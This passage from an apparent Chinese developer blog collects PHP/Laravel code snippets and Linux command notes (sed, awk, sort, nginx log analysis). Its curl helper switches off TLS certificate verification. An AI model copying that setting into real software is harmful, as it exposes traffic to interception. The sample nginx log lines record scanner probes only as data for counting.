$val = base_convert($val, 10, 2); $val = str_pad($val, 8, 0, STR_PAD_LEFT); return $val; &#125;, $pack);echo implode(' ', $tmp);01011100 01111000 00110000 00110000 01011100 01111000 00110001 00110000 文件yield123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 /** * 获取所有符合条件的日志内容https://learnku.com/laravel/t/25396#reply83796 *https://github.com/y-ui/laravel-running-time/blob/master/src/Commands/RunningTimeCommand.php * @return array */ protected function getLogFiles() &#123; $files = []; $days = $this-&gt;end-&gt;diff($this-&gt;start)-&gt;format('%a'); for ($n = 0; $n &lt;= $days; $n++) &#123; $files[] = $this-&gt;logPath . '/' . $this-&gt;start-&gt;format('Y-m-d') . '.log'; $this-&gt;start-&gt;modify('+1 days'); &#125; $contents = []; foreach ($files as $file) &#123; if (file_exists($file)) &#123; //默认还是使用file函数读取，但是使用yield，有效减少了多个日志文件统计时的内存开销，因为数据越多使用fgets花费时间越多，400W数据时 时间差达到了100% if ($this-&gt;option('lessMemory')) &#123; $fp = fopen($file, 'r'); while (($line = fgets($fp)) !== false) &#123; yield $line; &#125; fclose($fp); &#125; else &#123; yield file($file); &#125; &#125; &#125; return $contents; &#125;$logs = $this-&gt;getLogFiles(); $pathTimes = $times = []; foreach ($logs as $log) &#123; list($time, $path) = explode('||', rtrim($log)); if (!isset($pathTimes[$path])) &#123; $pathTimes[$path] = [ 'path' =&gt; $path, 'max' =&gt; 0, 'min' =&gt; 0, 'count' =&gt; 0, 'total' =&gt; 0, ]; &#125; if ($time &gt; $pathTimes[$path]['max']) $pathTimes[$path]['max'] = $time; if ($time &lt; $pathTimes[$path]['min']) $pathTimes[$path]['min'] = $time; ++$pathTimes[$path]['count']; $pathTimes[$path]['total'] += $time; &#125; register_shutdown_function(__NAMESPACE__ . '\RunningTimeCommand::errorHandle');public static function errorHandle() &#123; $error = error_get_last(); if ($error &amp;&amp; stripos($error['message'], 'Allowed memory size of') !== false) &#123; echo "\n Warnning: Out of memory! you can run command with --lessMemory to reduce memory usage\n"; exit; &#125; &#125; 队列1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283队列是一种特殊的线性表(链表)，特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作(FIFO)，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。 队列是先进先出https://learnku.com/articles/25814队列中数据元素之间的关系是一对一的关系，即除了第一个和最后一个数据元素之外，其它数据元素都是首尾相接的。class Node&#123; public $data; public $next; public function __construct($data,$next=null)&#123; $this-&gt;data = $data; $this-&gt;next = $next; &#125;&#125;class Queue&#123; public $front = null; public $rear = null; public $size = 0; public function __construct()&#123; &#125; public function push($data) &#123; $n = new Node($data); if($this-&gt;front == null &amp;&amp; $this-&gt;rear == null)&#123; $this-&gt;front = $n; $this-&gt;rear = $n; &#125;else&#123; $this-&gt;rear-&gt;next = $n; $this-&gt;rear = $n; &#125; $this-&gt;size++; &#125; public function shift() &#123; if($this-&gt;front)&#123; $this-&gt;size--; $data = $this-&gt;front-&gt;data; $this-&gt;front = $this-&gt;front-&gt;next; return $data; &#125;else&#123; return null; &#125; &#125;&#125;// $s = new Queue();// $s-&gt;push("aaaa");// $s-&gt;push("bb");// $s-&gt;push("cc");// $s-&gt;push("dd");// $s-&gt;push("fifo");// // echo $s-&gt;shift();// while($data = $s-&gt;shift())&#123;// echo $data."&lt;br&gt;";// &#125;//数组实现队列https://learnku.com/articles/25814// $arr = [];// array_push($arr,"张三");// array_push($arr,"李四");// array_push($arr,"王五");// array_push($arr,"王六");// while($data = array_shift($arr))&#123;// echo $data."&lt;br&gt;";// &#125;//数组实现队列 $arr = [];//定义一个数组队列 array_push($arr,"张三");//压入到队列尾部 array_push($arr,"李四"); array_push($arr,"王五"); array_push($arr,"王六"); while($data = array_shift($arr))&#123;//从头部弹出一个队列数据 echo $data."&lt;br&gt;"; &#125; PhpSpreadsheet 实现读取写入 Execl123456789composer require phpoffice/phpspreadsheetrequire'vendor/autoload.php';usePhpOffice\PhpSpreadsheet\Spreadsheet;usePhpOffice\PhpSpreadsheet\Writer\Xlsx;https://laravelacademy.org/post/19518.html $spreadsheet = new Spreadsheet(); $sheet = $spreadsheet-&gt;getActiveSheet(); $sheet-&gt;setCellValue('A1', 'Hello World !');$writer = new Xlsx($spreadsheet); $writer-&gt;save('hello world.xlsx'); 重试机制1234567891011121314151617$retry = 2;//http://liuxiaochun.cn/2018/08/10/php-mongoclient-no-candidate-servers-found-%E5%88%86%E6%9E%90/do &#123; try &#123; $mongo = new MongoClient("mongodb://127.0.0.1:27018", array( 'replicaSet' =&gt; 'rs0', 'connect' =&gt; true, 'connectTimeoutMS' =&gt; 10000 )); break; &#125; catch(MongoException $e) &#123; if (0 == $retry--) &#123; //log return; &#125; &#125;&#125; while($retry); laravel first 更新不成功1234567$user =user::where('id',2)-&gt;first(['name','age']);$user-&gt;name='php'$user-&gt;save();//正确$user =user::where('id',2)-&gt;first(['name','id']);$user-&gt;name='php'$user-&gt;save(); Laravel 关联查询限制条数1234567891011121314151617181920212223242526272829303132333435363738select `u`.`id`,`u`.`name`,`num` from `users` as `u` left join (select `user_id`,count(*) as `num` from books group by `user_id`) as `b` on `u`.id = `b`.user_idselect distinct `u`.`id`,`u`.`name`,IFNULL( `b`.`num`, 0 ) AS num from `users` as `u` left join (select `user_id`,count(*) as `num` from books group by `user_id`) as `b` on `u`.id = `b`.user_idpublic function test3()&#123; //统计出所有内部员工的user_id https://learnku.com/articles/25944 $user_ids = [1,2,3,4,5]; $users = User::selectRaw('u.id,IFNULL( b.number, 0 ) AS number') -&gt;from('users as u') -&gt;distinct() -&gt;whereIn('id', $user_ids) -&gt;leftJoin('books as b',function ($join) use($user_ids)&#123; $join-&gt;selectRaw('user_id,count(*) as number')-&gt;whereIn('user_id', $user_ids)-&gt;groupBy('user_id')-&gt;on('u.id', '=', 'b.user_id'); &#125;) -&gt;get(); return $users;&#125;Unknown column 'b.number' in 'field list' (SQL: select distinct u.id,IFNULL( b.number, 0 ) AS number from `users` as `u` left join `books` as `b` on `user_id` in (1, 2, 3, 4, 5) and `u`.`id` = `b`.`user_id` where `id` in (1, 2, 3, 4, 5))public function test2()&#123; //统计出所有内部员工的user_id $user_ids = [1,2,3,4,5]; $bookQuery = Book::selectRaw('user_id,count(*) as number')-&gt;whereIn('user_id', $user_ids)-&gt;groupBy('user_id'); //制作一个query builder $users = User::selectRaw('u.id,IFNULL( b.number, 0 ) AS number') -&gt;from('users as u') -&gt;distinct() -&gt;whereIn('id', $user_ids) -&gt;leftJoin(\DB::raw("(&#123;$bookQuery-&gt;toSql()&#125;) as b"),function ($join) use($bookQuery)&#123; //toSql()返回的是等待绑定参数的SQL语句 $join-&gt;mergeBindings($bookQuery-&gt;getQuery())-&gt;on('u.id','=','b.user_id'); //mergeBindings是将SQl的参数进行绑定 &#125;) -&gt;get(); return $users;&#125; laravel MassAssignmentException12345678910111213141516171819202122232425262728293031323334353637383940414243&gt;&gt;&gt; $s= Stock::where(['uid'=&gt;3230498441,'readtime'=&gt;0 ])-&gt;first()=&gt; &lt;Stock #0000000041071db4000000000f7f2b98&gt; &#123; id: 678, uuid: "01ec5da0-43ad-11e9-820c-217bded4b29c", uid: 3230498441, ctime: "2019-03-11 11:23:15", readtime: 0 &#125;&gt;&gt;&gt; $s-&gt;update(['readtime'=&gt;time()])Illuminate\Database\Eloquent\MassAssignmentException with message 'readtime'cat vendor\laravel\framework\src\Illuminate\Database\Eloquent\Model.phppublic function fill(array $attributes) &#123; $totallyGuarded = $this-&gt;totallyGuarded(); foreach ($this-&gt;fillableFromArray($attributes) as $key =&gt; $value) &#123; $key = $this-&gt;removeTableFromKey($key); // The developers may choose to place some attributes in the "fillable" // array, which means only those attributes may be set through mass // assignment to the model, and all others will just be ignored. if ($this-&gt;isFillable($key)) &#123; $this-&gt;setAttribute($key, $value); &#125; elseif ($totallyGuarded) &#123; throw new MassAssignmentException($key);//这里报错 &#125; &#125; return $this; &#125;public function totallyGuarded() &#123; return count($this-&gt;fillable) == 0 &amp;&amp; $this-&gt;guarded == array('*'); &#125; model文件添加 protected $guarded = [];这个问题的关键是 save 方法，因为这个方法在不同的环境下会有不同的效果。如果一个 Model 他还不存在，则调用 save 方法的作用是 insert 一条记录。如果此 Model 已经存在于数据库，则调用 save 方法的效果是 Update 这条存在的记录。所以文档强调的是：如果你调用 save 方法来更新 Model，那么只有这个 Model 对应的数据存在于数据库中时，才会触发 updating 和 updated 事件（因为不存在的话就是 insert 操作，会触发 creating 和 craeted 事件）。如果你调用 save 方法来保存或更新 Model，那么不管数据记录是否已经存在，都会触发 saving 和 saved 这两个事件。文档表述可能存在问题，但意思是这个意思。https://learnku.com/laravel/t/8942/is-the-updating-and-updated-event-triggered-description-discrepancy 1234567890 转换成 1,234,567,890123456789$str='1234567890';function demo($str)&#123; $str=strrev($str);//先翻转字符串 https://learnku.com/articles/25953#reply84620 $arr=str_split($str,3);//每3个隔开 $str=strrev(implode(',',$arr));//在把数组以，变成字符串 在翻转 echo $str;&#125;&gt;&gt;&gt; number_format('1234567890',3,',',',');=&gt; "1,234,567,890,000" curl cookie1234567891011121314151617181920mycurl('xxx',3,3,$_COOKIE)function myCurl($url,$time=3,$retries = 3, $cookie = [])&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_TIMEOUT, $time); // curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false); curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false); if($cookie) &#123; curl_setopt($ch, CURLOPT_COOKIE, http_build_query($cookie, '', ';'));//a=1;b=2 &#125; $result = false; while(($result === false) &amp;&amp; (--$retries &gt; 0))&#123; $result = curl_exec($ch); &#125; curl_close($ch); return $result; &#125; 创建 Zip 压缩文件并提供下载123456789101112131415161718192021222324252627282930313233343536$zip_file = 'invoices.zip'; // 要下载的压缩包的名称 https://learnku.com/laravel/t/26087// 初始化 PHP 类$zip = new \ZipArchive();$zip-&gt;open($zip_file, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);$invoice_file = 'invoices/aaa001.pdf';// 添加文件：第二个参数是待压缩文件在压缩包中的路径// 所以，它将在 ZIP 中创建另一个名为 "storage/" 的路径，并把文件放入目录。$zip-&gt;addFile(storage_path($invoice_file), $invoice_file);$zip-&gt;close();// 我们将会在文件下载后立刻把文件返回原样return response()-&gt;download($zip_file);$zip_file = 'invoices.zip';$zip = new \ZipArchive();$zip-&gt;open($zip_file, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);$path = storage_path('invoices');$files = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($path));foreach ($files as $name =&gt; $file)&#123; // 我们要跳过所有子目录 if (!$file-&gt;isDir()) &#123; $filePath = $file-&gt;getRealPath(); // 用 substr/strlen 获取文件扩展名 $relativePath = 'invoices/' . substr($filePath, strlen($path) + 1); $zip-&gt;addFile($filePath, $relativePath); &#125;&#125;$zip-&gt;close();return response()-&gt;download($zip_file); php email123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?php[root@localhost ~]# service sendmail statussendmail is stoppedsm-client is stopped[root@localhost ~]# service sendmail startStarting sendmail: [ OK ]Starting sm-client: [ OK ][root@localhost ~]# service sendmail statussendmail (pid 8746) is running...sm-client (pid 8756) is running...$to = 'user@example.com';$subject = "Beautiful HTML Email using PHP by CodexWorld";$htmlContent = file_get_contents("email_template.html");$htmlContent = ' &lt;html&gt; &lt;head&gt; &lt;title&gt;Welcome to CodexWorld&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Thanks you for joining with us!&lt;/h1&gt; &lt;table cellspacing="0" style="border: 2px dashed #FB4314; width: 300px; height: 200px;"&gt; &lt;tr&gt; &lt;th&gt;Name:&lt;/th&gt;&lt;td&gt;CodexWorld&lt;/td&gt; &lt;/tr&gt; &lt;tr style="background-color: #e0e0e0;"&gt; &lt;th&gt;Email:&lt;/th&gt;&lt;td&gt;contact@codexworld.com&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;Website:&lt;/th&gt;&lt;td&gt;&lt;a href="http://www.codexworld.com"&gt;www.codexworld.com&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt;';// Set content-type header for sending HTML email$headers = "MIME-Version: 1.0" . "\r\n";$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";// Additional headers https://www.codexworld.com/send-beautiful-html-email-using-php/$headers .= 'From: CodexWorld&lt;sender@example.com&gt;' . "\r\n";$headers .= 'Cc: welcome@example.com' . "\r\n";$headers .= 'Bcc: welcome2@example.com' . "\r\n";// Send emailif(mail($to,$subject,$htmlContent,$headers)): $successMsg = 'Email has sent successfully.';else: $errorMsg = 'Email sending fail.';endif;$to = 'maryjane@email.com';$subject = 'Marriage Proposal';$message = 'Hi Jane, will you marry me?'; $from = 'peterparker@email.com'; // Sending emailif(mail($to, $subject, $message))&#123; echo 'Your mail has been sent successfully.';&#125; else&#123; echo 'Unable to send email. Please try again.';&#125; PHP+openssl实现非对称加密 从零开始搭建一个lnmp运行环境 Session 与 Token 身份验证 字符集和字符编码 php函数 PHP导出百万Excel PHP 编写守护进程 判断文件是否为图片的方法 消息队列及PHP中的简单实现与应用 Laravel Eloquent 提示和技巧 Laravel 中的 Event 和事件的概念 Redis 主从复制、哨兵及集群部署]]></content>
      <tags>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux常用命令收集]]></title>
    <url>%2F2018%2F12%2F27%2Flinux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[sed123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475删除某行对98k.txt的行进行操作，将操作结果输出到终端（只是做模拟操作，不改动源文件）sed "1d" 98k.txt # 输出删除第一行后的文件内容sed "$d" 98k.txt # 输出删除最后一行后的文件内容sed "1,2d" 98k.txt # 输出删除第一行到第二行后的文件内容sed "2,$d" 98k.txt # 输出删除第2行到最后1行后的文件内容显示某行sed -n "1p" 98k.txt # 只显示文件的第一行 sed -n "$p" 98k.txt # 只显示文件的最后一行sed -n "1,2p" 98k.txt # 只显示文件的第一行到第二行sed -n "2,$p" 98k.txt # 显示文件的第二行到最后一行使用安静模式进行查询sed -n "/ruby/p" 98k.txt输出关键字ruby所在行的内容；其中"/str/p"，str为搜索的文本内容sed -n "/\$/p" 98k.txt输出关键字$所在行的内容，使用反斜线\屏蔽特殊含义增加一行或多行字符串sed "1a drink tea" 98k.txt # 在第一行后增加字符串"drink tea"sed "1,3a drink tea" 98k.txt # 在第一行到第三行后增加字符串"drink tea"sed "1a drink tea\nor coffee" 98k.txt # 在第一行后增加两行，换行使用\n，可多次使用\n添加多行增加另外一个文件的内容sed "1r 1.txt" 98k.txt # 把1.txt的内容增加到98k.txt的第一行后替代一行或多行sed "1c Hi" 98k.txt # 把98k.txt的第一行替换为Hised "1,2c Hi" 98k.txt # 把98k.txt的第一行到第二行替换为Hi替换一行中的某部分字符串格式：sed "s/要替换的字符串/新的字符串/g" 98k.txt （要替换的字符串可以用正则表达式）sed "s/ruby/bird/g" 98k.txt # 把全部的ruby替换为birdsed "s/ruby//g" 98k.txt # 把全部的ruby替换为空，即删除ruby字符串# 对每行匹配到的第一个字符串进行替换sed -i "s/原字符串/新字符串/" 98k.txt# 对全局匹配上的所有字符串进行替换sed -i "s/原字符串/新字符串/g" 98k.txt# 删除所有匹配到字符串的行sed -i "/匹配字符串/d" 98k.txt# 特定字符串的行后插入新行sed -i "/特定字符串/a 新行字符串" 98k.txt# 特定字符串的行前插入新行sed -i "/特定字符串/i 新行字符串" 98k.txt# 把匹配行中的某个字符串替换为目标字符串sed -i "/匹配字符串/s/源字符串/目标字符串/g" 98k.txt# 在文件98k.txt中的末行之后，添加byesed -i "$a bye" 98k.txt# 对于文件第3行，把匹配上的所有字符串进行替换sed -i "3s/原字符串/新字符串/g" 98k.txtecho hello|sed 's/hello/(&amp;)/' #将hello放在扩号中sed -i '/DEVICE/c\Ethernet' test nl /etc/passwd | sed '2i drink tea' sed -i '/connect/s#YES#NO#' test #匹配connect的行，把YES替换成NO 将文件的分隔符从逗号更改为管道head mydata.csv | sed 's/,/|/g' sort1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556sort [-fbMnrtuk] [file or stdin]选项与参数：-f ：忽略大小写的差异，例如 A 与 a 视为编码相同；-b ：忽略最前面的空格符部分；-M ：以月份的名字来排序，例如 JAN, DEC 等等的排序方法；-n ：使用『纯数字』进行排序(默认是以文字型态来排序的)；-r ：反向排序；-u ：就是 uniq ，相同的数据中，仅出现一行代表；-t ：分隔符，默认是用 [tab] 键来分隔；-k ：以那个区间 (field) 来进行排序的意思 sort -m file1 file2 合并两个文件sort file1&gt;file1；cat file1，你会得到一个空文件。这时候要使用-o参数来实现这个功能。-n是按照数字大小排序，-r是以相反顺序，-k是指定需要爱排序的栏位，-t指定栏位分隔符为冒号sort file1 -o file1sort -u是全文本去重，而uniq是比较相邻行，将第二个及以后更多重复行删去。sort file2 |uniq -c file删除重复行： uniq file.txt sort file.txt | uniq sort -u file.txt 只显示单一行： uniq -u file.txt sort file.txt | uniq -u 统计各行在文件中出现的次数： sort file.txt | uniq -c 在文件中找出重复的行： sort file.txt | uniq -d 利用sort和uniq求两个文件的并集，交集和差集 并集：cat file1.txt file2.txt | sort | uniq &gt; file.txt 交集：cat file1.txt file2.txt | sort | uniq -d &gt;file.txt 差集：求file1.txt相对于file2.txt的差集，可先求出两者的交集temp.txt，然后在file1.txt中除去temp.txt即可。 cat file1.txt file2.txt | sort | uniq -d &gt;temp.txt cat file1.txt temp.txt | sort | uniq -u &gt;file.txtsort -u 会达到和典型的 sort file.txt | uniq 模式一样的结果sort -t"," -k2,2 filename.csvegrep "php.*artisan" 匹配php artisangrep "first_value\|second_value" filename.csv cut1删除第一和第三列cut -d, -f 1,3 filename.csv 合并文件1234567891011121314# names.txtadamjohnzach# jobs.txtlawyeryoutuberdeveloper# Join the two into a CSVpaste -d ',' names.txt jobs.txt &gt; person_data.txt# Outputadam,lawyerjohn,youtuberzach,developer awk123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293awk -F":" '&#123;print $1&#125;' /etc/passwd awk -F":" '&#123;print $1,$3&#125;' /etc/passwd #多了一个逗号，$1与$3使用空格分隔 awk -F":" '&#123;print "Username:" $1 "\t\t Uid:" $3 &#125;' /etc/passwd #自定义输出 awk -F: '&#123;print NF&#125;' /etc/passwd #显示每行有多少字段 awk -F: '&#123;print $NF&#125;' /etc/passwd #将每行第NF个字段的值打印出来 awk -F: 'NF==4 &#123;print&#125;' /etc/passwd #显示只有4个字段的行 awk -F: 'NF&gt;2&#123;print $0&#125;' /etc/passwd #显示每行字段数量大于2的行 awk -F: '&#123;print NR,NF,$NF,"\t",$0&#125;' /etc/passwd #依次打印行号，字段数，最后字段值，制表符，每行内容 awk -F: 'NR==5 || NR==6&#123;print&#125;' /etc/passwd #显示第5行和第6行 //匹配代码块 //纯字符匹配 !//纯字符不匹配 ~//字段值匹配 !~//字段值不匹配 ~/a1|a2/字段值匹配a1或a2 awk '/mysql/&#123;print $0&#125;' /etc/passwd #三条指令结果一样 awk '!/mysql/&#123;print $0&#125;' /etc/passwd #输出不匹配mysql的行 awk '!/mysql|mail/&#123;print&#125;' /etc/passwd #输出不匹配mysql或mail的行 awk '/[2][7][7]*/&#123;print $0&#125;' /etc/passwd #匹配包含27为数字开头的行，如27，277，2777... awk -F: '$1~/mail/&#123;print $1&#125;' /etc/passwd #$1匹配指定内容才显示 awk -F: '$1!~/mail|mysql/&#123;print $1&#125;' /etc/passwd IF语句 必须用在&#123;&#125;中，且比较内容用()扩起来 awk -F: '&#123;if($1~/mail/) print $1&#125;' /etc/passwd awk -F: '&#123;if($1~/mail/) &#123;print $1&#125;&#125;' /etc/passwd awk -F: '&#123;if($1~/mail/) &#123;print $1&#125; else &#123;print $2&#125;&#125;' /etc/passwd #if...else... 条件表达式 == != &gt; &gt;= awk -F":" '&#123;if($1=="mysql") print $3&#125;' /etc/passwd //与上面相同 awk -F":" '$1!="mysql"&#123;print $3&#125;' /etc/passwd //不等于 awk -F":" '$3&gt;1000&#123;print $3&#125;' /etc/passwd //大于 逻辑运算符 &amp;&amp; || awk -F: '&#123;if($1~/mail/ &amp;&amp; $3&gt;8) print &#125;' /etc/passwd awk -F: '&#123;if($1~/mail/ || $3&gt;1000) print &#125;' /etc/passwd 删除重复行 $ awk '!($0 in array) &#123; array[$0]; print&#125;' temp 打印/etc/passwd中所有包含同样的uid和gid的行 $ awk -F ':' '$3=$4' /etc/passwd 打印文件中的指定部分的字段 $ awk '&#123;print $2,$5;&#125;' employee.txt 比较的时候忽略空白符 $ diff -w name_list.txt name_list_new.txt 下载文件中列出的所有url对应的页面 $ cat url-list.txt | xargs wget –c #替代grep awk '/word/' filename.csv 对于所有带我们指定单词 word 的行，awk 打印第三和第四列，用 tab 分隔。-F, 用于指定切分时的列分隔符为逗号。 awk -F, '/word/ &#123; print $3 "\t" $4 &#125;' filename.csv 要获取文件中的第 53 条记录 awk -F, 'NR == 53' filename.csv 打印第一列等于给定字符串的行的行号和列 awk -F, ' $1 == "string" &#123; print NR, $0 &#125; ' filename.csv awk -F, ' $3 &gt;= 2005 &amp;&amp; $5 &lt;= 1000 &#123; print NR, $0 &#125; ' filename.csv 求出第三列的总和 awk -F, '&#123; x+=$3 &#125; END &#123; print x &#125;' filename.csv 组合多个 CSV 文件，忽略标题，然后在最后附加它 awk 'FNR==1 &amp;&amp; NR!=1&#123;next;&#125;&#123;print&#125;' *.csv &gt; final_file.csv 内置函数 gsub() 替换多个值 awk '&#123;gsub(/scarlet|ruby|puce/, "red"); print&#125;' 打印出现了两次的行 awk -F, '++seen[$0] == 2' filename.csv 获取文件的行列数： awk -F, 'END &#123; print NF, NR &#125;' filename.csv # Prettier version awk -F, 'BEGIN &#123; print "COLUMNS", "ROWS" &#125;; END &#123; print NF, NR &#125;' filename.csv根据第一列去重，相同的保留第二列值最大的那个https://segmentfault.com/q/1010000000665713fdf 284 asd 112adf 146csb 513dfg 576asd 346adf 263csb 092dfg 547[root@VM_0_14_centos ~]# cat awk.txt | sort -rnk2 | awk '&#123;if (!keys[$1]) print $0; keys[$1] = 1;&#125;'dfg 576csb 513asd 346fdf 284adf 263先按第二列数字大小逆序，然后再按第一列去重，这样就能得到第二列最大的非重复行数据。[root@VM_0_14_centos ~]# sort -rnk2,2 awk.txt |sort -uk1,1adf 263asd 346csb 513dfg 576fdf 284第一列等于 something 的那些行，求出第三列值的总和awk -F, '$1 == "something" &#123; x+=$3 &#125; END &#123; print x &#125;' filename.csv 快捷键1234567$ bind -p"\C-g": abort"\C-x\C-g": abort"\e\C-g": abort"\C-j": accept-line查找所有使用了Control键的绑定https://gywbd.github.io/posts/2014/11/linux-keybindings.html$ bind -p | grep '\\c' 解压123456789创建一个新的tar文件$ tar cvf archive_name.tar dirname/解压tar文件$ tar xvf archive_name.tar查看tar文件$ tar tvf archive_name.tar 测试并发12345678ab -n 100 -c 10 -l http://www.your_site.com-n number 总的请求数-c concurrency 并发数 -l 表示当某个请求的回复长度不与第一个请求的回复长度一致时，不把它作为失败的请求POST方法：https://shuwoom.com/?p=1542ab -n 100 -c 10 -p post.txt http://xxx/test.phppost.txt里面是参数，如data=&#123;"name":"wgc"&#125;，但是要url编码以后的参数 查看当前目录下各个文件或文件夹的大小12345678910111213[root@VM_0_14_centos ~]# du -h --max-depth=1 .7.5M ./.config5.8M ./imgbed-project1.7M ./Chatroom8.0K ./.httpie20K ./.ssh2.7M ./lnmp-docker101M ./daily-signer708K ./pick-1.9.032M ./gaga688K ./.acme.sh1.9M ./dockser-server3.4M ./shadowsocksr 查找字符串1234567find ./*|xargs grep debug#https://github.com/BurntSushi/ripgrep/[root@VM_0_14_centos ~]# rg 'redis'imgbed-project/LICENSE627:free software which everyone can redistribute and change under these terms.637: This program is free software: you can redistribute it and/or modify657: This is free software, and you are welcome to redistribute it Nginx 日志统计 ip 访问数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859切割日志查找7月17日访问log导出到17.log文件中：cat gelin_web_access.log | egrep "17/Jul/2017" | sed -n '/00:00:00/,/23:59:59/p' &gt; /tmp/17.log查看访问量前10的IPawk '&#123;print $1&#125;' 17.log | sort | uniq -c | sort -nr | head -n 10 查看访问前10的URLawk '&#123;print $11&#125;' gelin_web_access.log | sort | uniq -c | sort -nr | head -n 10查询访问最频繁的URLawk '&#123;print $7&#125;' gelin_web_access.log | sort | uniq -c | sort -n -k 1 -r | more查询访问最频繁的IPawk '&#123;print $1&#125;' gelin_web_access.log | sort | uniq -c | sort -n -k 1 -r | more根据访问IP统计UVawk '&#123;print $1&#125;' gelin_web_access.log | sort | uniq -c | wc -l统计访问URL统计PVawk '&#123;print $7&#125;' gelin_web_access.log | wc -l根据时间段统计查看日志cat gelin_web_access.log | sed -n '/17\/Jul\/2017:12/,/17\/Jul\/2017:13/p' | more[root@VM_0_14_centos ~]# cat /var/log/nginx/access.log|more120.132.3.65 - - [21/Dec/2018:06:28:57 +0800] "GET http://www.qq.com/404/search_children.js HTTP/1.1" 404 3650 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36" "-"120.132.3.65 - - [21/Dec/2018:06:28:57 +0800] "\x04\x01\x00PpTi4\x00" 400 173 "-" "-" "-"120.132.3.65 - - [21/Dec/2018:06:28:57 +0800] "\x05\x01\x00" 400 173 "-" "-" "-"58.150.60.162 - manager [21/Dec/2018:08:08:21 +0800] "POST /WEB_VMS/LEVEL15/ HTTP/1.1" 404 3650 "-" "-" "-"95.213.177.123 - - [21/Dec/2018:08:36:15 +0800] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-" "-"60.191.52.254 - - [21/Dec/2018:09:35:18 +0800] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" "-"80.82.70.187 - - [21/Dec/2018:09:47:37 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 3650 "-" "Mozilla" "-"139.162.81.62 - - [21/Dec/2018:10:33:03 +0800] "GET http://clientapi.ipip.net/echo.php?info=1234567890 HTTP/1.1" 404 3650 "-" "Go-http-client/1.1" "-"[root@VM_0_14_centos ~]# cat /var/log/nginx/access.log|awk '&#123;print $1&#125;'|sort|uniq -c|sort -nrk1 3 120.132.3.65 1 95.213.177.123 1 80.82.78.50 1 80.82.70.187 1 60.191.52.254 1 58.150.60.162 1 139.162.81.62at /var/log/nginx/access.log|awk '&#123;ipArr[$1]++&#125; END&#123;for( item in ipArr) print item,ipArr[item]&#125;' | sort -r -k21.根据访问IP统计UVawk '&#123;print $1&#125;' access.log|sort | uniq -c |wc -l2.统计访问URL统计PVawk '&#123;print $7&#125;' access.log|wc -l3.查询访问最频繁的URLawk '&#123;print $7&#125;' access.log|sort | uniq -c |sort -n -k 1 -r|more4.查询访问最频繁的IPawk '&#123;print $1&#125;' access.log|sort | uniq -c |sort -n -k 1 -r|more5.根据时间段统计查看日志cat access.log| sed -n '/14\/Mar\/2015:21/,/14\/Mar\/2015:22/p'|more 文件比较（交集、差集）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748交集（打印两个文件相同的行）[root@VM_0_14_centos ~]# cat aaa.txtaaabbbcccdddeee111222[root@VM_0_14_centos ~]# cat bbb.txtbbbcccaaahhhtttjjj[root@VM_0_14_centos ~]# comm -12 &lt;(sort aaa.txt) &lt;(sort bbb.txt)aaabbbccc求差（打印两个文件中不相同的行）[root@VM_0_14_centos ~]# comm -3 &lt;(sort aaa.txt) &lt;(sort bbb.txt)111222dddeee hhh jjj ttt[root@VM_0_14_centos ~]# comm -3 &lt;(sort aaa.txt) &lt;(sort bbb.txt)|sed 's/^\t//' 111 222 ddd eee hhh jjj ttt aaa.txt的差集[root@VM_0_14_centos ~]# comm -23 &lt;(sort aaa.txt) &lt;(sort bbb.txt)111222dddeeebbb.txt的差集[root@VM_0_14_centos ~]# comm -13 &lt;(sort aaa.txt) &lt;(sort bbb.txt)hhhjjjttt 转换编码1iconv -f ISO-8859-1 -t UTF-8 &lt; input.txt &gt; output.txt 执行算术运算12expr 5 + 2echo $[16 + 4]#https://www.itcodemonkey.com/article/11866.html send email12345678910111213141516171819202122232425262728293031323334[root@VM_0_14_centos ~]# wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz--2018-12-20 16:40:34-- http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gzResolving caspian.dotconf.net (caspian.dotconf.net)... 159.89.153.157Connecting to caspian.dotconf.net (caspian.dotconf.net)|159.89.153.157|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 29740 (29K) [application/octet-stream]Saving to: ‘sendEmail-v1.56.tar.gz’100%[===============================================================================================&gt;] 29,740 159KB/s in 0.2s2018-12-20 16:40:35 (159 KB/s) - ‘sendEmail-v1.56.tar.gz’ saved [29740/29740][root@VM_0_14_centos ~]# tar -zxvf 